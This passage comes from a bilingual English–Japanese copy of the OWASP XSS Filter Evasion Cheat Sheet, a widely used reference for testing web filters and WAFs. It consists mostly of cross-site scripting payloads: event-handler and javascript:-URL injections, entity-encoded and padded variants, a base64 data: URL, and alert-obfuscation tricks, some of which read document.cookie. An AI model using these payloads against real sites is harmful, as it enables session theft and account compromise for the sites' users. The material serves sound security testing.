- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*&#123;x:expression(alert(/xss/))&#125;//<style></style>`

On Mouse Over​:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)">&lt;/OBJECT&gt; `
<!-- markdownlint-enable MD038-->

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

このリクエストは WAF を通過しない。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```html
/?param=<javascript:alert(document.cookie>)
```html

</div>

<div className="bilingualPair">
<div className="bilingualBlock english">
<span className="bilingualLabel english">English (原文)</span>

### Filter Bypass Alert Obfuscation

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\\u0065rt(1)`
- `top[‘al\\145rt’](1)`
- `top[‘al\\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

The payload should include leading and trailing backticks:

</div>
<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

このリクエストは WAF を通過し、特定のブラウザで XSS 攻撃が実行される。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
&#96;`${alert``}`&#96;
```text

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```html

</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### XSS のための WAF バイパス文字列

次の文字列は、WAF やフィルタがイベントハンドラ、要素名、エンコード、data URL、名前空間、構文の揺らぎをどのように扱うかを確認するためのテストペイロードである。

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

<!-- markdownlint-disable MD038-->
- `&lt;Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `&lt;Video> <source onerror = "javascript: alert (XSS)">`
- `&lt;Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `">&lt;/SCRIPT&gt;”>’>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*&#123;x:expression(alert(/xss/))&#125;//<style></style>`

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

On Mouse Over:

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `&lt;OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83">&lt;PARAM NAME="DataURL" VALUE="javascript:alert(1)">&lt;/OBJECT&gt; `
<!-- markdownlint-enable MD038-->

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

### フィルタバイパス Alert 難読化

次の例は、`alert` 呼び出しを別の構文やプロパティ参照、文字エスケープで表現し、単純な文字列検査を避ける手法である。

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\\u0065rt(1)`
- `top[‘al\\145rt’](1)`
- `top[‘al\\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

</div>
</div>

<div className="bilingualPair">

<div className="bilingualBlock japanese">
<span className="bilingualLabel japanese">日本語 (翻訳)</span>

ペイロードには先頭と末尾のバッククォートを含める必要がある。

</div>
</div>

<div className="bilingualCommon">
<span className="bilingualLabel common">コード・画像 (共通)</span>

```javascript
&#96;`${alert``}`&#96;
```html

</div>

</section>
</div>

## References

<div className="referenceFooter">

Since XSS examples that use a `javascript:` directive inside an `&lt;IMG` tag do not work on Firefox this approach uses decimal HTML character references as a workaround:

```html

 <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>
```text

This is often effective in bypassing XSS filters that look for the string `&\\#XX;`, since most people don't know about padding - which can be used up to 7 numeric characters total. This is also useful against filters that decode against strings like `$tmp\\_string =\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;` which incorrectly assumes a semicolon is required to terminate a HTML encoded string (This has been seen in the wild):

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>
```text

This attack is also viable against the filter for the string `$tmp\\_string=\\~ s/.\\*\\\\&\\#(\\\\d+);.\\*/$1/;`, because it assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters:

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>
```

</div>


## Attribution

<div className="attributionFooter">

- Original: XSS Filter Evasion Cheat Sheet
- Source: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- Copyright: Cheat Sheets Series Team
- License: Creative Commons Attribution-ShareAlike 4.0 International (CC BY-SA 4.0)
- License URL: https://creativecommons.org/licenses/by-sa/4.0/
- Changes: English original retained for comparison. Japanese translation added. Bilingual display generated from official source and local Japanese translation.
- Retrieved: 2026-05-20

</div>
